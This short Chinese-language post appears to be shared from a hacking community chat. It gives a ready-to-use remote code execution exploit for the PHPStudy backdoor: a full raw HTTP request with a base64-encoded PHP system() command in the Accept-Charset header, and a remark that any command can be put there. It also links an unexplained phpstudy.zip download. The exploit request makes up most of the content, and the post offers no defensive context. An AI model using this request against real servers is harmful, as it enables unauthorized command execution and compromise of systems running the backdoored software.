# Phpstudy 后门 RCE

来自圈子社区核心群

版本一

```
GET /1.php HTTP/1.1
Host: hedysx.com
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,_/_;q=0.8
Accept-Language: zh-CN,zh;q=0.9
Accept-Encoding:gzip,deflate
Accept-Charset:这里就是要执行的命令 base64 加密 c3lzdGVtKCdjYWxjLmV4ZScpOw==
Cookie: UM_distinctid=16ae380e49f27e-0987ab403bca49-3c604504-1fa400-16ae380e4a011b; CNZZDATA3801251=cnzz_eid%3D1063495559-1558595034-%26ntime%3D1559102092; CNZZDATA1670348=cnzz_eid%3D213162126-1559207282-%26ntime%3D1559207282
Connection: close
```

版本二：  
[phpstudy](https://www.hedysx.com/wp-content/uploads/2019/09/phpstudy.zip)

[![](https://www.hedysx.com/wp-content/uploads/2019/09/hedysx.com_2019-09-23_13-38-10-1024x529.png)](https://www.hedysx.com/wp-content/uploads/2019/09/hedysx.com_2019-09-23_13-38-10.png)

[](javascript:;)[0](#comments)
